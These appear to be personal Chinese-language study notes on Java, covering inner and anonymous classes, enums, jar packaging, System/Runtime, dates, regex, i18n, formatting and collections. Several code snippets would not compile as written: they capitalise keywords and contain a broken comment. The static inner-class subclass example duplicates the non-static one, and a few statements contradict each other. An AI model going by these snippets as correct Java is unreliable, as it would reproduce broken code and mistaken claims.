要注意：外部类不能用private修饰，也不能被protected修饰。因为在外部类本身之外并无外部类（这个外部类只是属于包）。所以这两个修饰符并无意义。也不能使用static修饰，不属于某个类。
但是，对于内部类而言，其处于外部类的里面，所以对于内部类而已，private、protected这些修饰符是有意义的，所以其修饰符可以是这个三种中任何一个。也可以使用static修饰。有static修饰的内部类属于外部类本身。否则是属于实例。

内部类上一级程序单元是外部类，外部类上一级程序单元是包。
Java中，每一个类是一个文件，然后很多类编译出来的结果放在一起组成一个包。

内部类的定义和普通类是一样的。内部类可以直接使用（需要加上外部类名.this<当外部类非static>或者外部类名.<当外部类是static>引用）外部类的属性、方法、构造器等，无论是private还是别的。
同样，外部类的方法也可以使用内部类，也就是在外部类的方法中创建内部类的实例。通过这个内部类对象引用变量来调用内部类自己的方法。
但是外部类不能直接使用内部类的成员（属性、方法等），而只能通过创建内部类对象来使用这个内部类的成员（属性、方法等）。不能直接使用。
实际上，将内部类视为寄生类，将外部类视为宿主类，更容易理解。

注：编译之后，内部类的文件编译而成的class文件名变为外部类$内部类.class。

调用原则：
内部类本质是寄生类。
没有static修饰的内部类，寄生在外部类的实例里面。
所以在外部类的方法中创建内部类的实例时，实际上是使用：new this.mouth(),
当然实际上在外部类方法中创建内部类的实例时，使用的是：new mouth()这样的写法。那么外部类的static方法等就不能访问static内部类。
有static修饰的内部类，是寄生在外部类的类里面。如果，内部类是static修饰的，那么，外部类的static成员方法就可以直接使用static内部类了，而且这个static内部类是属于整个外部类的，所以不用通过外部类实例调用外部类方法，不用在外部类的方法中来创建内部类实例。当然这个static的内部类也不能访问非static的外部类成员。

内部类的使用：
内部类优点：提供更好的封装性。将外部类的零件直接封装起来，可以让外部完全对其义务所值。
在外部类里面使用内部类和使用内部类是同样的，没有特殊。
在内部类外面使用内部类时，分为static内部类和非static内部类两种情况。
在外部类之外使用非static内部类时，使用外部类.内部类+变量名声明内部类的引用变量。
Eg：outer.inner in;//这就是创建了一个内部类引用变量。

创建内部类实例对象的时候，要先创建外部类对象，然后再创建内部类的实例。
Eg：
Outer ot；//先创建一个外部类引用变量。
Ot.new inner(); 	//使用这个外部类引用变量来创建一个内部类的实例对象。

如果某一个类是继承了内部类，那么该怎样使用内部类？
寄生类的子类也是寄生类。它也需要一个宿主。
>
	Class innerSub extends outer.inner
	{
	   //内部类的子类的构造函数就是与众不同的。因为子类必须要调用父类的构造函数一次，所以这个调用就是一个问题。
		Public Innersub()
		{
			New outer().super();//对于这个子类而言会自动调用父类的构造器，但是我们知道其父类的构造器必须通过父类的对象来调用，而不能直接调用，所以要先创建一个父类的对象。    
		}
		Public innersub(outer out)
		{
			Out.super();
		}//父类是一个非static内部类，所以子类自动调用父类的构造器的时候，需要使用父类的寄主对象来调用父类的构造器。所以这里可以传入一个out寄主对象。
	}


B、在外部类之外使用static内部类的时候。
他可以直接通过外部类来进行调用，而不用像非static内部类那样创建宿主类对象来使用内部类。只有用到外部类，内部类就有了，因为内部类就是属于外部类的，而不是属于外部类对象。不需要程序员去关注宿主，因为他的宿主是天然就有的。

子类继承Static内部类的时候，寄主天生就有，就是外部类本身。使用的时候，可以将外部类当成内部类的一个包即可。
>
	Class innerSub extends outer.inner
	{
	   //内部类的子类的构造函数就是与众不同的。因为子类必须要调用父类的构造函数一次，所以这个调用就是一个问题。
		Public Innersub()
		{
			New outer().super();//对于这个子类而言会自动调用父类的构造器，但是我   们知道其父类的构造器必须通过父类的对象来调用，而不能直接调用，所以要先创建一个父类的对象。    
		}
		//或者：
		Public innersub(outer out)
		{
			Out.super();
		}//父类是一个非static内部类，所以子类自动调用父类的构造器的时候，需要使用父类的寄主对象来调用父类的构造器。所以这里可以传入一个out寄主对象。
	}


局部内部类：用得不多。因为意义不大（因为局部内部类的作用域太有限了，仅在方法里面有效，也导致使用比较简单）。了解一些即可。
局部内部类的作用就是：当我们在任何一个方法中某个地方时，需要使用一个新的类的时候，如，实现一个接口或者继承一个类的时候，这个时候就要临时创建一个类，这时候不必再在外面创建类，太麻烦，可以在这个地方现场创建一个类，实现接口或者继承其他的类。这样就是局部内部类的作用。当然，内部匿名类也是这个作用。
>
	Public int f（）
	{	
		Class pro 
		{
			……
		}
		//或者
		Class pro implements per
		{
			……
		}
	}


局部内部类的内容和普通类都是一样的。

局部内部类可以同名的，如，在不同的方法中，可以定义相同的内部类。
所以，局部内部类的class文件名为（每一个类都有一个文件，当然包括，内部类、局部内部类这些）：外部类+n（表示是外部类中第几个局部内部类）+局部内部类.class。以代表多个重名的局部内部类。


匿名内部类：适合于创建只需要一次使用的类。没有名字的类。
所以，程序以后无法再次访问这个匿名内部类。
当程序在创建这个匿名内部类的时候，会立即创建这个匿名内部类的实例。

实际上在一个地方要使用一个新的类对象的时候，与其使用局部内部类，还不如使用匿名内部类，更加方便，且效果好。
语法格式：
>
	new 父类接口（）|父类构造器//这个新的匿名内部类可以是实现父类接口
					  //或者继承其他类，都可以，只是用一种随要随造					 //的方式予以实现，无名。但是方便。
	{
		//类体部分
	}

以上的语法格式返回了匿名内部类的实例对象。以后就只能使用这一个创建的实例对象。
>
	interface walkable
	{
    	void walk();
	}
	public class 
	{
		public static void main(String[] args)
		{
			walkable w=new walkable()
			{
			int a=10;//这里的匿名内部类的意思就是：walkable与{}共同构成对walkable这个			 //接口的重载，然后加上new就创建了一个实现类的实例对象。再进行向上转		 //型,被接口定义的变量所引用。实际上单纯的接口是不能创建对象的。但			 //是，如果匿名内部类实现了这个接口，就可以用这个匿名内内部类创建实例		 //对象了。所以这里做了两件事：创建一个接口实现类、用这个接口实现类.
			@Override
			public void walk()
			{
				System.out.println("walk");
			}
			public void f()
			{
				System.out.print("f");
			}
			//实现接口的匿名内部类中可以有field、重写方法、方法、初始化块，但不能有构造
			//器，因为匿名内部类没有名字，没办法写构造器。
			/*
			 * 以上代码相当于：
			 * class walker implenments walkable
			 * {
			 *		int a=10;
			 *		@override
			 *		public void walk()
			 *		{
			 *			system.out.println("walk");
			 *		}
			 *
			 *		public void f()
			 *		{
			 *			System.out.print("f");
			 *		}
			 *	}
			 *
			 *	walkable w=new walker();
			 * /
		}；//注意匿名内部类这里有一“；”
	}
	}


就是说，原来实现一个接口，然后用这个实现类来创建一个类对象的工作可以通过匿名内部类的方法予以完成，在任何地方，随要随做，无需名称，很快完成。



匿名内部类规则：

1. 匿名内部类只能继承一个已有的类或者实现一个接口（而不能和普通的实现类那样实现多个接口）。
2. 匿名内部类必须实现接口或者父类的所有抽象方法，因为，匿名内部类不能是抽象的。因为创建这个匿名内部类之后就需要立刻创建实例。
匿名内部类没有构造器，因为没有类名，但是可以有初始化块。

本质上来看：类、枚举、接口都是同一级的概念。  
抽象性：类<内部类<接口。  

#Java中的枚举
-------
枚举：用于代表实例数量是固定的**特殊类**。有点像单例类，只不过**有多个实例**。枚举非常重要。  
语法示例如下：
>
	[修饰符] enum 枚举名
	{
		//必须在第一行立即写上该枚举的所有实例对象名。这里写上实例，表面上看是写出实例对象名，实际上是在调用构造器进行初始化。所以，如果本枚举类拥有无参构造器，那么直接写对象名就是调用默认构造器。但是，如果没有无参构造器，就需要使用有参构造器，就不仅仅是直接写对象名就行，还得显式调用有参构造器。
		//其他部分和普通类是同样的。同样可以有field、构造器（必须是private构造器，默认的就是private的，大部分时候不用写）、方法、内部类\内部枚举\内部接口等东西。其本质就是一个类。
	}
>
	public enum Gender
	{	
    	Male,//这是调用了该类的默认构造器，省略了括号。
		Female("woman");//显式调用有参构造器。实际上相当于：Gender Female=new Gender("woman")；
		String name;
		Gender()//默认构造器
		{
			name="man";
		}
		Gender(String agender)//有参构造器
		{
			name=agender;
		}
	}

`enum`关键字的地位与`class`这个关键字的地位是一样的。  

修饰符：`public|省略` 或者 `abstract|final`（但是二者必须出现其中之一。默认的是`final`）。  

枚举类的特征：  
默认继承了`Java`自己的枚举类，实际上还继承了`object`类。由于所有的枚举都继承自一个`Java`中的枚举，就和普通类都继承自`object`类一样，都继承了某一些方法。  
例如：所有的枚举都有`values()`方法，这个方法可以返回所有的枚举值。
  
枚举类的构造器只能用`private`来修饰，因为不能再类外随意创建实例，实例数已经固定了。这样是为了保护构造器。  
使用枚举类的实例对象的时候，直接用即可，不能再去`new`创建。
  
枚举类的方法要非常小心。这里的主要问题是：  
枚举类是特殊的类，因为它的类对象在设计类的时候就已经设定了，而且相应类对象的各个属性也已经设定了(构造类对象的时候)。所以就不能在类中方法里面随意设定属性的值。  
也就是说，在`set()`这种方法里面，设置某些属性的值的时候，在这些方法中一定要进行所要设定目标值的合理性的检验，否则就会导致违背类自己限定的对象的实际情况。或者直接不允许出现设定对象属性的方法。  
包含抽象方法的枚举类，如果某个方法有`abstract`修饰，那么就不能有`final`和`static`。  

更重要的是，当枚举类具有抽象方法的时候，那么这个枚举类就是一个抽象类，那么，这个抽象内部类怎么能够有实例对象呢？
`Answer`：对于一个抽象类而言，不能通过调用它的构造器来创造它的对象，这个时候，如果真需要使用抽象类的对象，可以通过匿名内部类来进行。
>
	abstract class mt
	{
		int f=10;
		public abstract void fo();
		public void fm()
		{
			System.out.println("abs");
		}
	}	
>
	public class abs 
	{
		public static void main(String[] args)
		{
			System.out.println("hello world");
			mt m=new mt()//这里通过一个匿名内部类来创建一个抽象类的对象。
			{
				public void fo()
				{
					System.out.println("fo");
				}
			};
			m.fm();
		}
	}

`Answer`：这时候可以使用匿名内部类，使用匿名内部类来创建包含抽象方法的枚举类的对象。这个匿名内部类继承的就是这个包含抽象方法的枚举类（需要实现枚举类中的`abstract`方法）。因为要创建这个枚举类的对象，所以就可以先创建继承本枚举类的子类，然后通过这个子类创建枚举类的对象。然后就可以随意使用我们创建的这些对象了。
>
	public enum seasons
	{
		spring()//这里就是一个匿名内部类，继承了枚举类。然后通过这个匿名内部类创建了一个对象。因为不能通过调用枚举类的构造器来初始化创建枚举类的对象，所以只能使用匿名内部类。这样可以避免抽象枚举类无法通过构造器构建对象的缺陷。
		{
			public void infor()
			{
				System.out.println("spring");
			}
		},//注意，这里的枚举中的匿名内部类后面使用的是“,”而不是在类中写匿名内部类时所使用的“;”。也就是说这里的分隔符用什么决定于这个创建的对象后面本来该用什么分割符。
		summer()
		{
			public void infor()
			{
				System.out.println("summer");
			}
		},
		autumn()
		{
			public void infor()
			{
				System.out.println("autumn");
			}
		},
		winter()
		{
			public void infor()
			{
				System.out.println("winter");
			}
		};
>	
		public abstract void infor();
>	
		public static void main(String[] args)
		{
			System.out.println("hello world");
>
			seasons.spring.infor();
			seasons.summer.infor();
			seasons.autumn.infor();
			seasons.winter.infor();
		}
	}

枚举是一个特殊类：实例数固定，且必须在类第一行就写出来。

枚举类也可以实现接口：  
1. 我们可以在枚举类里面实现接口中所有的抽象方法。  
这样可以保证枚举类不是`abstract`类，可以创建实例，然后其他的和一般的枚举类都是一样的。  
2. 我们不在枚举中实现接口中的所有的抽象方法。  
这样枚举类就是`abstract`类，然后就可以使用匿名内部类创建枚举类的对象。

枚举用于描述我们*已知一个类中的对象有那么几个的时候*，如，成绩分等级时几个等级都已知，季节中就呢么几个，性别只有那么几个。我们已知对象的具体情况的时候，无需创造无数的对象。

注：选择语句`switch`的表达式必须是以下几种之一。
>
	switch(byte|short|char|int|String|枚举);//只有这六种，如、double等都是不行的。


#Java中的jar命令
---------------
作用：把多个文件打包成一个压缩包。与`winzip`压缩格式是一样的，只不过jar压缩结果中在各种`class`文件之外会添加一个`meta-inf`的文件夹，其中有一个`menifest.mf`文件，这个文件就是清单文件。  

通常得到的压缩包有3种:  
1. `*.jar`:它里面包括的是n个`class`文件。  
2. `*.war`:它是一个`web`应用打包生成的文件。与`jar`的格式是一样的，只是后缀不同而已。  
3. `*.ea`r:它是一个企业应用打包生成的包。

`jar`命令的用法：
某个工程在一个文件夹中，里面都是`class`文件。将所有的`class`文件压缩成一个`jar`文件压缩包。  
> 
 `jar -cvf myname.jar *.class `  //f:表示后面的是目标`jar`文件名。`*.class`表示将文件夹所有的`class`文件都压缩起来。

如果不生成清单文件：
>
>
	jar -cMf myname.jar *.class

查看`jar`压缩包的内容：
>
	jar -tf myname.jar
	jar -tvf myname.jar:查看详细内容

解压：
>
	jar -xf myname.jar:将jar压缩包解压。

更新压缩包：将新class添加到原来的jar包中。
>
	jar -uvf myname.jar *.class //将文件夹中的新的class加入到原来的jar包中。


为什么做jar包？  
因为一个真实项目中会有很多`class`文件，所以存在系统管理不方便、性能低（`jvm`需要依次加载不同的`class`文件，效率很低）。  
所以可以将多个`class`文件打包成一个`jar`包，这样的好处就是：多个`class`文件统一成一个`jar`包方便管理，`jvm`不用将`jar`包解压再加载，而是可以加载整个`jar`包（加载所有的`class`），这样效率高。


将整个项目打包成可执行的`jar`包：  
我们将所有的`class`打包成`jar`文件后，这些`class`中只有一个`class`中的`main`方法才可以执行，也就是说项目是从这个`class`文件开始执行的，但是`jvm`不知道哪一个才是可以开始执行的`class`文件，所以，需要打包成可执行的`jar`包。
通过`-e`选项告诉`jvm`哪一个`class`才是整个项目的主类。
>
	jar -cvfe myname.jar hello *.class//后面的说明hello.class是主类，*.class表示压缩文件的来源为目录下所有的class文件。
产生的文件在已经装了`JVM`的情况下可以点击运行。  
如果没有安装JVM，可以使用：
>
	java -jar my.jar来进行运行。//用于运行控制台程序。
	javaw -jar my.jar//这是用于运行界面程序。

`Ant`工具是一个更强大的生成`jar`包的工具。

Java中的入口方法
------------------------
系统`JVM`在调用这个`main()`方法的时候，`JVM`与我们的类不会在同一个包中，`JVM`也不会是我们这个类的子类。所以只能用`public`修饰`main()`方法。  
也不能先创建实例来调用`main()`方法，只能用类拥有的方法，这样在`JVM`载入这个类的时候，就自动加载这个类所拥有的方法。所以`main()`方法就是一个`static`方法。  
`main()`方法的参数：`args`，这是一个`String`数组，默认长度是0；可以在运行的时候，接参数，将参数值传递进入`main()`方法。  
>
`java 主类名 参数1 参数2 参数3……`


Java中与系统有关的两个类
-------------

System类  
代表我们的`JVM`所在的操作系统，如`XP`系统。  
如果要获取操作平台的相关特性，就要使用`System`类。  
`System`类中所有的方法和`field`都是`static`的。无需对象来调用。
>
`System.out`:代表屏幕这个对象，这个`out`实际上是`System`这个类的一个`static field`，属于整个类。因为系统本来就有这个东西，而且是类拥有的。  
>
`System.in`:代表键盘这个对象，这个`in`实际上是`System`这个类的一个`static field`，属于整个类。
>
`System.exit(int status)`:使用这个`static`方法可以退出JVM，这个方法实际上是`System`这个类的一个`static`方法。遇到这个代码，该`java`程序立刻结束,退出虚拟机。
>
`System.getenv()`:获取所有环境变量。
>
`System.getenv(String name)`:获取指定环境变量值。
>
`System.getProperties()`:获取所有的系统属性。
>
`System.getProperty(String key)`：获取指定的系统属性。  

Runtime类  
代表`JVM`所在的`JRE`。  
`JRE=JVM+核心类库（JDK）`。  
若要获取`JVM（虚拟机）`的特性，就要使用`Runtime`类。

`Runtime`类的方法不是`static`的，而且这个类没有构造器。  
但是这是一个单例类。它的构造器被隐藏了，外界是看不到的。  
只能通过`getRuntime()`这个`static`方法来获得实例。然后通过这个实例来调用`Runtime`的各种方法进行操作。
>
	Runtime rt=Runtime.getRuntime();//获得runtime类的实例
	System.out.println(rt.availableProcessors());//使用这个实例调用这个类的方法，获得JVM的处理器个数

还可以通过`Runtime`类对象的方法`exex()`来调用运行操作系统（xp）命令或者其中的一个程序：
实际上只要是安装于这个系统中的所有软件都可以通过这个类对象进行调用运行。
>
	rt.exec("D:/Program Files/Bin/QQ.exe");//在虚拟机中开辟一个新的进程，然后再执行用系统中的某一个程序。注意调用时的路径问题，如果没有指定绝对路径，而只有相对路径，就回到path环境变量中进行搜索。

因此，有了这个东西，我们可以做一个有界面的程序，界面上都是本系统中拥有的所有程序的图标按钮，然后每一个按钮都和对应的程序.exe连接在一起，那么运行了这个程序之后，点击相应的按钮就可以快捷启动对应的软件。

Java中用于处理日期的类
----------
`Date`类，表示一个日期。  
其未过时的构造器只有：
`Date()与Date(long date)`，当然，过时的方法等都还是可以使用。  
在Java中月份从0开始。`Date`是毫秒数，从1970开始。  
`System`类中有一个`static`方法`currentTimeMillis()`用于获取当前时间已经过的毫秒数。
>
	//initialize the de with default empty constructor_
	Date de=new Date();
	System.out.println(de);
>		
	//get the currentTimeMillis from 1970
	System.out.println(System.currentTimeMillis());
>
	//initialize the de with default empty constructor_
	de=new Date(System.currentTimeMillis()-3*24*60*60*1000);
	System.out.println(de);//output the date three days earlier

`Calender`类，也表示一个时间。  
由于`Date`类已经过时了，所以要使用`Calender`类来代替。但是`Date`类并不能完全丢弃。  
但是`Calender`的构造器不能被调用。所以不能自己调用该类的构造器去创建对象实例。
而是通过其一个`static`方法去创建一个实例。这个方法是`getInstance()`。
>
	//output the static field of clendar
	System.out.println(Calendar.DAY_OF_MONTH);
>	
	//get the object of calendar class
	Calendar cal=Calendar.getInstance();
	System.out.println(cal.getTime());
>		
	//set the time field
	cal.set(Calendar.MONTH,10);
	System.out.println(cal.getTime());
>
	//add the value to the field without the limits
	cal.add(Calendar.MONTH,12);
	System.out.println(cal.getTime());
>						
	//add the value to the field with the limits
	cal.roll(Calendar.MONTH,12);
	System.out.println(cal.getTime());


Java中的正则表达式
---------
所谓的正则表达式就是：可以匹配n个字符串的字符串模板。是一个非常强大的字符串模板。  
>
	`*代表n个字符`  
	`？代表一个字符`  
一般在命令行中，经常使用此类的符号来搜索。但是功能太弱。所以需要正则表达式。是跨语言工具。

注：vim编辑器对正则表达式支持很好。“/”+正则表达式。

A、正则表达式支持的通配符有：
>
	“.” :匹配一个任意字符。
	“\s”:space,匹配一个任意的空白、tab。
	“\S”:space,匹配一个任意的非空白、tab。
	“\d”:匹配任意一个数字。Digital。
	“\D”:匹配任意一个非数字。
	“\w”:匹配一个单词字符。
	“\W”:匹配一个非单词字符。

注：实际写程序中，由于需要转义，所以在代码中，”\”应该写为“\\”。

Java中的正则表达式也不是足够强大。  
Java中正则表达式：`regular expression`：`regex包`。
有两个正则表达式的工具类：`Pattern`类与`Matcher`类。

注意：正则表达式本身就是一个`String`对象。

`String`类中与正则表达式有关的几个方法：
>
`Match(String regex)`：用于判断`String`对象是否匹配后面的`regex`模板。
>
	String str="1a3s";
	System.out.println(str.matches("\\d\\w\\d\\S"));//匹配。编程的时候使用转义字符，\\表示\。  
`replaceAll(char a, char b)`：替换。
>
	System.out.println(str.replaceAll("a","b"));
`Split(String regex);`//按照通配符的位置所在进行切开。

B、正则表达式中的方括号表达式：  
这里的方括号表达式，整个方括号表示一个字符。  
1. 枚举：[abc]：表示“a”“b”“c”三个字符中的任意一个字符。  
2. 范围：[a-f]：表示a-f这个范围内的任意一个字符。  
3. 枚举与范围共存：[a-f123]:表示a-f这个范围、1、2、3这些字符中任意一个字符。  
4. 求否：[^a-f]：表示不是a-f这个范围内的任意一个字符。或者，[^abc]:表示不是a、b、c中任意一个字符。  
5. 求交：[a-g&&[^b-c]]:表示a-g范围与非b-c范围的交集中的任意一个字符。  
6. ()：表示括号里面任意一个字符串：（sd|fg|er）：表示这个三个字符串中任意一种。

C、正则表达式中的特殊字符：
>
	()、[]、{}、\、？、*、+、^、$
对于这些特殊字符，如果在正则表达式中表示它们的本义也就是字面意思，就要对他们使用转义字符。
>
	^表示一行的开头
	$表示一行的结尾

D、正则表达式中表示出现次数的副词：作用是用于修饰出现在其前面的通配符。
>
	？：表示？前面的东西可以出现0-1次。  
	* ：表示*前面的东西可以出现n次。
>
	\d?:出现一个数字
	\w*:出现n个字母
	.*:出现n个字符
>
	+：表示+前面的东西可以出现1-n次。
	{m，n}：表示前面的东西可以出现m-n次
	{，n}：最多n次
	{m，}：最少m次
	{x}：表示出现x次

注：正则表达式中，直接写数字，表示没有使用通配符。  
所谓的正则表达式就是用一个个的符号对一个`String`对象的每一位进行限制规定，以达到对各位分别进行适配的目的。

`Pattern`类的使用。
`Pattern`类对象实际上就是代表了一个**正则表达式**。它们就是同一个东西。  
没有构造方法，需要通过一个static方法创建一个pattern类对象。
>
	Pattern pa=Pattern.compile(“\\w”);//创建了一个pattern类对象。  
以后就可以使用这个`pa`对象来代替`\\w`这个正则表达式了。

Matcher类：表示一个匹配工具类。
有用的Matcher类方法:
>
	Find()；
	Group()；

如果想正则表达式具有更复杂的功能，那就需要用到这两个类。其他时候不必使用，一般的匹配符即可完成。  
例如：实现特定字符串搜索提取的功能时可以使用这两个类。  
如：
>
创建一个网络爬虫，其功能就是：从任何一个网站开始，通过提取出这个网站上的所有超链接，获得其他网站的入口，这就是网络爬虫的作用。  
爬虫工作步骤：  
1. 向指定网页发送请求（申请访问网页）。  
2. 获取该网页的响应内容（就是网站将网页的内容发送过来）。  
3. 提取出网页内容中的超链接地址。此步骤中使用正则表达式，使用这两个类的作用。

#Java中的国际化
--------------
所谓的java的国际化，就是希望程序本身自适应所有的用户（各种语言界面）环境。就是`I18N`。

其本质就是：查找&&替换。  
就是对程序中出现的字符或者字符串到资源文件中进行查找替换成目标的字符或者字符串。

资源文件：用于为程序提供国际化消息。  
资源文件的命名：`<baseName>_语言代码_国家代码.properties `  
如：
>
Ms_zh_CN.properties

同一个程序的所有资源文件的`baseName`必须是相同的，也就是说对于不同语言的资源文件命名时，`baseName`都是一样的。
该文件中内容：
>
	hi=你好！

如果资源文件中包含有非西欧字符（中文，日文等），就需要使用native2ascii工具来处理这个文件，然后才能用。
使用这个工具处理资源文件的命令：
>
	native2ascii Ms_zh_CN.properties mse_zh_CN.properties //将前者处理成后者这个文件。就是将汉字处理成标准的Unicode值。


使用ResourceBundle类来加载资源文件。
>
	Locale currentLocale=Locale.getDefault(Locale.Category.FORMAT);//获得当前locale。也就是我的这台计算机所在的区域和使用的语言，以备在下一步中选用所对应的语言资源文件。
>
	ResourceBundle res=ResourceBundle.getBundle(“mse”,currentLocale)；//使用ResourceBundle来加载资源文件。
	System.out.println(res.getString(“hi”));//使用查找替换，将”hi”替换成”你好!”也即是使用资源文件。



国际化中，还有一个问题就是占位符，就是这个字符串暂时未定，只能在语言资源文件中写上一个占位符。

资源文件中：
>
	hi={0}，你好！{1}  //在资源文件中加上占位符，以供运行时参数来填补占位符。
	源程序中：
	System.out.println(MessageFormat.format(res.getString("hi"),args[0],args[1]));//这里使用MessageFormat类，为消息中的占位符填充参数值。

运行这个程序的时候，使用运行时参数args[0],args[1]来填充资源文件中的占位符。

CMD中：
>
	java hell 张三 李四 // 这里在运行的时候，用张三、李四两个字符填充语言资源文件中两个占位符。


国际化的步骤：  
1. 提供资源文件。  
2. 对于非西欧字符，要将它进行处理成标准`Unicode`字符。使用`native2ascii`工具。  
3. 探查获得本计算机所在区域以及所使用的语言。  
4. 使用一个`ResourceBundle`类来绑定我们所需要的语言资源文件，也就是将探测到的计算机所使用的语言与我们已有的语言资源文件链接起来。  
5. 在程序中通过查找替换的形式使用语言资源文件中所对应的语言。


那么怎样查询所需语言和国家代码？
使用`Local`工具类即可。
>
	Locale currentLocale=Locale.getDefault(Locale.Category.DISPLAY);


#Java中的Format类的使用
-----------------  
`Format`类有三个子类：`MessageFormat、NumberFormat、DateFormat`。  

`NumberFormat`类：用于格式化数字，所谓格式化数字，就是将数字转换成相应所要求格式的字符串。
不能使用构造器来进行构造，而是使用以下的`static`方法来获得实例对象。
>
	getCurrencyInstance（）；用于将数字格式化成货币字符串。
	getIntegerInstance（）：用于将数字格式化成整数字符串。
	getPercentInstance（）：用于将数字格式化成百分号字符串。

并且，这些方法中还可以传入`locale`对象，设置格式化成哪个国家的字符串。

得到`NumberFormat`类的实例对象之后，调用其以下方法，就可以将数字转换成相应所要的字符串。
>
	String format（double number）；

`DateFormat`类：用于格式化日期。不能直接创建实例，而是通过以下的`static`方法创建实例。
>
	getDateInstance（）；用于将日期对象格式化成日期字符串，只有日期，没有时间。
	getTimeInstance（）；用于将日期对象格式化成时间字符串，只有时间，没有日期。
	getDateTimeInstance（）；用于将日期对象格式化成日期时间字符串，都有。

并且，这些方法中还可以传入`locale`对象，设置格式化成哪个国家的字符串以及格式化风格。
>
	DateFormat  usShort=DateFormat.getDateTimeInstance(DateFormat.SHORT,DateFormat.LONG,Locale.US);

得到`DateFormat`类的实例对象之后，调用对象的以下方法，就可以将日期对象格式化成相应想要的字符串。  
>
	String format（Date date）；
>
	Date date = new Date();//创建一个时间对象实例。
	System.out.println(df.format(date));//将时间对象实例格式化成想要的String格式。


还有一个常用的`simpledateformat`是`Dateformat`的子类。
其可以进行任意自定义格式的格式化，是简单的日期时间格式器。**可以将日期格式化为字符串，也可以将字符串格式化为日期**。其具有构造器。
>
按照自己的要求*将日期对象格式化成一个日期字符串*。
>
	SimpleDateFormat sdf = new SimpleDateFormat("生日：y年M月d日,是今年的第D天");//将格式器设定为我们所需要的任何格式。
	System.out.println(sdf.format(date));//使用格式化器。
>
它的格式化是随心所欲的。
>
将一个*日期字符串格式化成一个日期对象*。
>
	String dat = "2014/5/25 13.34/12";//时间字符串
	SimpleDateFormat sdf1 = new SimpleDateFormat("y/M%d H.m/s");//创建对象
	Date da = sdf1.parse(dat);//将时间字符串转换成时间对象
>		
	System.out.println(da);//输出时间对象。





#Java中的集合框架(容器类)
---------
集合框架是`Java`的一个子系统。  
`Java`中的容器用于装对象。  
那么这些容器中应该有哪些方法？  
1. 装入对象的方法。  
2. 把对象读取出来的方法。读取之后，这个对象依旧在容器当中。  
3. 把指定对象从容器中删除。  
4. 把整个容器清空。  
5. 遍历，将每一个对象都读取一次。  
6. 将A容器中的对象倒入到B容器。  
7. 从A容器中的所有对象中减去B容器中的所有对象。  
8. 容器之间求交集。

##容器类基本知识

*容器类*的所有方法都是通过实现其他的定义了各种方法名的**接口**(如、`Collection`接口)来达到目的。

定义了各种方法名的**接口**有：(见图：`Collection_Structure.png`)  
>
a. `Collection`接口。里面都是各种方法的声明的集合，没有定义方法，因为接口是极其抽象的，**里面都只有抽象方法**。  
>
b. `List`接口，**其继承自`Collection`接口**。使用条件：存放位置有索引，因此元素可以重复。类似于数组。被线性表实现（*顺序表或者链表*）。
>  
c. `Queue`接口，**也继承自`Collection`接口**。使用条件：先进先出。（*被栈、队列实现*）。
>    
d. `Set`接口，**其继承自`Collection`接口**，内容基本上和`Collection`一样。使用条件：存放位置无索引，但不是随机的，不允许存放元素重复。（*被集合实现*）。

实现了以上那些**接口的类**有：
>  
a. `List`接口被线性表实现，线性表可以基于*顺序表或者链表*。
所以，实现`List`接口的有`ArrayList`类（基于顺序表的实现）、`LinkedList`类（基于链表的实现）、`Vector`类（仅作了解，几乎无用了）。
>
b. `Queue`接口被队列实现，队列是特殊的线性表，也就是在继承线性表类之后加入某些特征（只能先入先出、进行功能上的削弱）获得队列。  
`Queue`派生了一个子接口`Deque`，这个子接口的使用条件：双端队列，两端都可进可出。也就是可以先进先出，也可以后进先出。  
其本质就是：既是栈也是队列。既有栈的方法也有队列的方法。在`Java`中看上去是没有栈这个东西，但实际上是有的，就是`Deque`。  
`Deque`接口的实现类：  
1. 基于顺序表的实现，`ArrayDeque`类。具有顺序表的功能，又有栈、队列的特点。  
2. 基于链表的实现，`Linked
3. `类，这个类既实现了`Deque`又实现了`List`，功能强大。
>
c. `HashSet`类：实现了`Set`接口的类。`HashSet`无序。其有一个子类：`LinkedHashSet`，这是有序的。  
另，对于`Set`接口而言，其还有一个子接口`SortedSet`，这个接口可用于需要排序的集合（也就是说，一旦一个类实现了这个`SortedSet`，那就具有了排序的功能，这个接口里面的功能就都有了）。  
如，`TreeSet`类实现了`SortedSet`这个接口。  
`Vector`类有一个子类`Stack`（仅作了解）。

以上这些实现类中，`ArrayList、LinkedList、ArrayDeque、HashSet、TreeSet`这5个类要重点掌握。

注意：  
1. 我们这里所使用的顺序表(数组)都是动态数组，也就是说可以动态扩充大小。  
2. 我们这里使用的链表都是双向链表，可以双向遍历。

##Java中的容器类的使用  

###容器类的常用操作
>
	Collection<String> c1 = new HashSet<>();

这里使用了接口`Collection`做引用变量，而没有使用类`HashSet`作引用变量。  
同时，这里的`Collection`使用泛型规定了容器中对象类型，那么后面的类`HashSet`就可以不必写出对象类型，这就是所谓的“菱形语法”。

`Removeall()`与`addall()`是针对容器与容器之间的操作。  
`Retainall()`是容器之间求交集的操作。  
遍历`Set`集合迭代器使用示例：
>
	Iterator it = c1.iterator();//创建迭代器
	while(it.hasNext())
	{
		System.out.println(it.next());//使用迭代器
	}

遍历`Set`集合使用foreach循环：
>
	for（String elem：c1）
	{
	}
###List接口的使用

`List`接口就是用于线性结构类的。  
其特征就是：可以依据元素的`index`来存、取元素对象。    
`List`接口中有大量的依据`index`来进行操作的方法。所谓的依据`index`进行操作就是：在操作的时候告诉你的是元素的`index`，就是编号。  
即使是链表，告诉你的也是`index`编号，这就是所谓的依据`index`进行操作。  
链表和顺序表都是告诉你元素编号的。

同样，这里的`List`接口一般都用来创建引用变量，引用它的子类实例，以此体现多态。  
但是要注意的一点就是，如果使用接口创建的引用变量来引用子类实例，那么在要使用子类才有的方法之前，必须要先进行强制类型转换为子类实例变量。  

由于可以依据`index`访问元素，所以其多了一种遍历方式：
>
	List<String> ls = new ArrayList<>();
	for(int i=0;i<ls.size();i++)
	{
		System.out.println(ls.get(i));
	}

####`ArrayList`实现类  
这个类实现了`List`接口，底层是一个数组。  
####`Vector`实现类  
这个类和`ArrayList`相似，底层都是一个数组。这二者的性能非常快，比`hashSet`还快。但只是在查找的时候快，在删除、插入的时候很慢。  
####`LinkedList`实现类  
特征：既是线性表、又是队列、还是栈。基于链表实现。  
其底层是基于链表实现的。**通常**认为性能比不上`ArrayList`。在存取的时候性能很好，在查找的时候很慢。因为它也是根据索引进行操作的，也就是说，在操作的时候告诉`LinkedList`的依旧是`index`。
####`ArrayList`与 `Vector`的区别:  
